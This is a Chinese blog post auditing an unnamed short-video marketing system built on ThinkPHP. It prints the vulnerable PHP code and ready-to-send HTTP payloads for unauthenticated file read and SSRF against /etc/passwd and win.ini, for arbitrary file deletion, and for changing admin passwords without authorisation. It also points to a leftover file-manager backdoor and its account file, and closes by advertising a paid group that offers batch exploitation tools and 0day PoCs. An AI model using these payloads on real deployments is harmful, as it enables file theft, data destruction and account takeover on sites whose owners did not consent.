#  某短视频矩阵营销系统前台RCE漏洞审计   
 阿乐你好   2025-05-16 01:36  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**Fofa语句:请见文末**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5e7KicstY6UwJKPfGcbFX3picap5hUKygiccM1lUcBvtz3Dg7eXoQ0Gkn3QX7f0F0P7RKOyMuKY6GB1w/640?wx_fmt=png&from=appmsg "")  
  
**搭建完之后长这样.  ThinkPHP框架，需要将目录设置为Public.**  
  
**这套系统洞挺多的，大家可以研究学习一下**  
  
****  
**目录结构 控制器全都是简单的eval加密:**  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9IiberXJWaS77epSMib8cOMCMWpm5F1ZP9tmrAJa2x6bObGnueP7XV1MQ0Q/640?wx_fmt=png&from=appmsg "")  
## 0x01 前台任意文件读取+SSRF  
  
**在 /application/admin/controller/userinfo.php 控制器中的poihuoqu方法，存在curl_exec函数，传参可控，未加鉴权，且结果直接回显，导致任意文件读取和SSRF漏洞.**  
```
/*获取POI*/
public function poihuoqu(){
    $poi =  input('post.poi');
    $url = trim($poi);
    $info = curl_init();
    curl_setopt($info,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($info,CURLOPT_HEADER,0);
    curl_setopt($info,CURLOPT_NOBODY,0);
    curl_setopt($info,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($info,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($info,CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($info,CURLOPT_URL,$url);
    $output = curl_exec($info);
    curl_close($info);
    //$id = stripos($output,"poi_id=");
    $on = mb_stripos($output,"poi_id=");
    $er = mb_stripos($output,"&");
    $poiid = mb_substr($output,$on+7,$er-$on-7);

    if($output){

        return json(['code'=>1,'msg'=>$poiid]);
    }else{
        return json(['code'=>-1,'msg'=>'获取失败']);
    }
}
```  
  
Linux读取 Payload:  
```
POST /index.php/admin/Userinfo/poihuoqu HTTP/2
Host: 127.0.0.1
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 22

poi=file:///etc/passwd
```  
Windows读取 Payload:```
POST /index.php/admin/Userinfo/poihuoqu HTTP/2
Host: 127.0.0.1
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 22

poi=file:///C:/Windows/win.ini
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9IibqBZibeyibIENekibpHxwa7RrA0QFOf0HOCypJibESJnKVBhoic4oibvT6jibQ/640?wx_fmt=other&from=appmsg "")  
  
**Dict协议打内网Redis:**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9Iibxt90zeuv7hkIm6Xcbvo1vuOPz3dPuRXLxbMl9syMbqtmNbsgjU8RlQ/640?wx_fmt=png&from=appmsg "")  
##  0x02 前台任意文件删除  
  
**在 /static/admin/upload_file/php/remove_file.php 中存在unlink函数，且$file参数可控，导致任意文件删除，这里不多说了.**  
```
<?php 
  if(isset($_POST['file'])){
  $file = '../uploads/' . $_POST['file'];
if(file_exists($file)){
  unlink($file);
}
}
?>
```  
  
**Payload:**  
```
POST /static/admin/upload_file/php/remove_file.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 12
Content-Type: application/x-www-form-urlencoded
Cookie: BJYSESSION=oorquahq7r9csc3can1hpcjkj3; PHPSESSID=6kqil2pldpq19cq7dt590uc54h; KOD_SESSION_SSO=ni6912a1a0d53k4rb6r6hgrhof; KOD_SESSION_ID_1bcdf=d358i7lc74rt2mrush7aao808h
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/static/admin/upload_file/php/remove_file.php
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

file=aaa.txt
```  
## 0x03 前台未授权操纵+信息泄露漏洞  
  
**在 /application/admin/controller/xxxx.php 控制器中的xxxx方法直接GET获取page，然后查询数据表并直接将账号密码列出，并且未加鉴权函数.**  
  
**Payload:**  
```
请见文末
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9Iibg5z2Y0wwqqVIB5srCavFratAHicRR378pg4lMMbvfOv6TWjARuxxP7A/640?wx_fmt=png&from=appmsg "")  
  
**在 **** 方法中，可随意操纵任意账户，更改密码等操作**  
  
**直接访问 /index.php/admin/****/1 即可直接越权更改管理员密码**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9Iib86U0RMVo02EWbcu4Vbt6hfViaxjrrsDKmU9iaibCtPg11VQwgOEtxibStg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9IibPcxVdbujoCdpIrdrXYT3AedwXhibYWxfJGicF9rGRCg2a4HlOYtMCibpg/640?wx_fmt=other&from=appmsg "")  
  
**控制器不加任何鉴权，随便操纵用户，这套程序真抽象......**  
  
**在 upload_add 方法中，还有个文件上传，但是无回显，上传文件以微秒的md5来命名，所以实际利用价值比较低，这里就不多赘述了 .**  
```
public function upload_add(){

  $file = request()->file('image');
  if(!$file){
    $this -> error('请选择上传的图片');
  }
  $info = $file->move(ROOT_PATH . 'public' . DS . 'uploads/images');
  if($info){
    $data = array(
      'image'        =>$info->getSaveName(),
      'uid'          =>session('uid'),
    );
    $id = input('post.id');
    if(empty($id)){
      $list = Db::name('img')->insert($data);
    }else{
      $list = Db::name('img')->where('id',$id)->update($data);
    }


    if($list){
      $this -> success('上传成功',url('upload'));
      // echo $info->getSaveName();
    }else{
      $this -> error('上传失败');
    }
  }else{
    echo $file->getError();
  }
}
```  
## 0x04 前台任意文件上传1  
  
**Payload:**  
```
请见文末
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9IibGPlZAEiaiazzqRMYFQHvDoL8LQuJmszW03C7XvFg8tgLm432t5o3jFWg/640?wx_fmt=png&from=appmsg "")  
## 0x05 前台任意文件上传2  
  
**Payload:**  
```
请见文末
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9Iibt2lj3v4ea6Ux873h8h6ftEDS8FaJAJ67Q3asEK4KsuoUBAMDDYaUAQ/640?wx_fmt=png&from=appmsg "")  
## 0x06 前台任意文件上传3  
  
**Payload:**  
```
请见文末
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9IibXwJSymt9RLm2msIlictuEXdYfy09OqicpnkeYftYYWyG7HtibgBKbc13g/640?wx_fmt=png&from=appmsg "")  
  
## 0x07 某道云后门  
  
**访问 /static/******/index.php 直接能访问到可道云，版本为4.48，99%是开发者或者资源网的后门********......**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9IibbxlXGIX6JzllatEFx47Vg7SreZZeAxZTOWUYwrMk0TRIoINUvcgWpg/640?wx_fmt=png&from=appmsg "")  
  
**账号密码存在 /static/******/system_member.php 中**  
```
<?php exit;?>{
    "1": {
        "name": "admin",
        "path": "admin",
        "password": "请见文末",
        "userID": "1",
        "role": "1",
        "config": {
            "sizeMax": "0",
            "sizeUse": 1024
        },
        "groupInfo": {
            "1": "write"
        },
        "createTime": 1653827726,
        "status": 1,
        "lastLogin": 1655653441
    },
    "100": {
        "userID": "100",
        "name": "demo",
        "password": "请见文末",
        "role": "2",
        "config": {
            "sizeMax": 5,
            "sizeUse": 1048576
        },
        "groupInfo": {
            "1": "write"
        },
        "path": "demo",
        "status": 1,
        "lastLogin": 1711702666,
        "createTime": 1653827726
    },
    "101": {
        "userID": "101",
        "name": "guest",
        "password": "请见文末",
        "role": "100",
        "config": {
            "sizeMax": 0.1,
            "sizeUse": 1048576
        },
        "groupInfo": {
            "1": "read"
        },
        "path": "guest",
        "status": 1,
        "lastLogin": "",
        "createTime": 1653827726
    }
}
```  
  
**可道云能干什么我就不多说了，有兴趣可以自己去研究(读取数据库文件啥的，admin权限可以上传php文件):**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dCpMEuN5SbNVN3fRz2B9Iib5DwvYIKhSz3XTNCPZIH1HvpkicQ0x7Eujmhf5zYdDNKaxQnE7M8KvPQ/640?wx_fmt=png&from=appmsg "")  
## 0x08 完整报告下载  
  
完整Exp及源码已放在知识星球中，需要可自取!!!  
  
**高质量漏洞利用研究，代码审计圈子，每周至少更新三个0Day/Nday及对应漏洞的批量利用工具，团队内部POC，源码分享，星球不定时更新内外网攻防渗透技巧以及最新学习，SRC研究报告等。**  
  
**【圈子权益】**  
  
**1，一年至少999+漏洞Poc及对应漏洞批量利用工具**  
  
**2，各种漏洞利用工具及后续更新，渗透工具、文档资源分享**  
  
**3，内部漏洞库情报分享（目前已有150000+poc，会每日更新，包括部分未公开0/1day）**  
  
**4，加入内部微信群，遇到任何技术问题都可以进行快速提问、讨论交流；**  
  
**5，Fofa API 高级会员Key共享**  
  
**6,  高自动化代码审计工具共享**  
  
**圈子目前价格为已涨价至129元，现在星球有900+位师傅相信并选择加入我们**  
  
****  
**网站源码及漏洞库已于2025.4.2日更新**  
  
Fofa 高级会员 Key****  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dJt1pKCAicLgADFELyD7N2yh7LPSCjwdicjVT9I5kmk5d53XibibUmzz037tTfQx5prf7j21ed3oVTkQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
****  
超多审计资料，自动化审计工具  
  
![319d33192f5a9f019ec3f7a17cc25bb.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fOtUasHrnibBFTUkOIJJH5Goe8FhSg3arBlw7QLWsJl3xiczb5QnWfRKiaSvcMBPHLuwFjkWuuFicDwQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dVAUWP6LibARs3usK4kNz6g367ZEv3pT7cv8fl3YHMZH47sBH2IMy1J2XYeMNVXDJgLhP1yahI4pw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dPFicRheSpuSsBE8ZFeE6HwYQ7XZx91DUHD6M2jFjo9jwxZEnQs2PaU9jQAvYicVxtcIiaKI2QeRxqA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
****  
**圈子内部漏********洞库(日更)**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dO3JY3ibuSzzKb6JXHOsho8GllKEjcqXnSa6OY73aptxTiaibrLiaKrw85bDlFrRjR8aUGrxZKVQBTug/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**每篇文章均有完整指纹和详细POC**  
  
****  
**一起愉快地刷分**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTp1nDJvFuhT6INWEyGaCkEEclfEo8Ld6OBOzzJ3BkTVbrfqd41XhAhicA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dPFicRheSpuSsBE8ZFeE6HwwvkuIIecPQwHta0wibQuCqoSTqsc2K1KZDpJb3enDibBiau4EEhxrTYxA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTpt1uZwVAmW8XEscyvU51uc9sdiaHViaJKMEZyiaM4bAaQfGIPNd26u2A5w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**上千套审计源码，包括各种协同办公OA**  
  
****  
**入圈之后可私信我帮你开通永久VIP，已开通各大源码站VIP**  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ddnP3GPD4EFbjricqxLYKEMbdFQjC7ZWqVCo8nDCz3kL1UhibTicP4Nmb2fa2RmsYHtXUiacMlkYkCNg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dbasJicXJDEOR85icHkfIda3gg2HpaWjW2MZN9KZdGzX99Ofl7SRETFA4TicFabIO2UGibSONn6bhXQw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
****  
**高质量代码审计社区**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eYsOmVcqiczEs2xZkicGt1u6HibInHPVngJzcM5jLf64ncdDFEN0Sfzo5jFkUspBiaCTftaSsheb5JIQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，转转**  
  
**PS:关注公众号，持续更新漏洞文章**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
